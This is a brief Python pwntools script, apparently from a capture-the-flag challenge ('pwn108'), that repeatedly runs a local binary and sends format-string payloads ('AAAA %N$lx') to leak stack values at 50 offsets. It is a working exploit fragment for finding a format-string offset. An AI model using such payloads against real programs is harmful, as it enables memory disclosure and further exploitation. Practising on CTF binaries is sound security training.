from pwn import *

e = ELF("./pwn108.pwn108")

for i in range(50):
        io = e.process(level="error")
        io.recvuntil(b': ')
        io.sendline(b"zee")
        io.recvuntil(b': ')
        io.sendline(b"AAAA %%%d$lx" % i)
        io.recvline()
        io.recvuntil(b"AAAA ")
        print("%d - %s" % (i, io.recvline().strip()))
        io.close()
